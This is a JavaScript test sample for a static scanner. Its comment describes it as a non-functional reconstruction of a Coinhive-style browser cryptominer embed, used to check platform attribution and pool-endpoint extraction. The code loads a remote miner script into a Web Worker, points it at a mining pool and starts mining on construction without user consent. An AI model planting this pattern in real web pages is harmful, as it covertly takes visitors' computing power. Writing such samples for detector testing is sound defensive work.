/* Scanner validation sample - a hand-written reconstruction of the shape of a
   Coinhive-style embed, NOT recovered malware and NOT functional against any
   real pool. Purpose: check that collect/scan_static.py attributes the right
   platform, extracts the pool endpoint, and reports obfuscation metrics.

   Expected findings: platform Coinhive, endpoint wss://api.coinhive.com:5555,
   worker + WebAssembly indicators, startMining/stopMining API tokens. */

(function (window) {
  "use strict";
  if (window.CoinHive && window.CoinHive.loaded) return;

  var LOADER = "https://coinhive.com/lib/coinhive.min.js";
  var POOL = "wss://api.coinhive.com:5555/";
  var TOKEN = "48edFrgLabSampleTokenNotARealAccount48edFrgLabSample";

  window.CoinHive = { loaded: true, Anonymous: function (publicKey, options) {
    options = options || {};
    var threads = options.throttle ? 1 : (options.threads || 1);
    var workerUrl = LOADER + "?worker=1";
    var worker = new Worker(URL.createObjectURL(new Blob([
      "importScripts('" + workerUrl + "');"
    ])));
    var running = false, job = null, hashes = 0;

    worker.onmessage = function (ev) {
      if (ev.data.msg === "cm_j") { job = ev.data; }
      if (ev.data.msg === "cm_s") { hashes += ev.data.h; }
    };

    this.startMining = function (a) {
      running = true;
      worker.postMessage({ msg: "cs", params: { user: a || TOKEN, pool: POOL, algo: "cryptonight" } });
      return this;
    };
    this.stopMining = function () { running = false; worker.postMessage({ msg: "cx" }); return this; };
    this.setTarget = function (t) { worker.postMessage({ msg: "ct", target: t }); return this; };
    this.getHashesPerSecond = function () { return hashes; };
    this.onResolved = function (cb) { cb(POOL); };
    for (var i = 0; i < threads; i++) { this.startMining(); }
  } };
})(window);
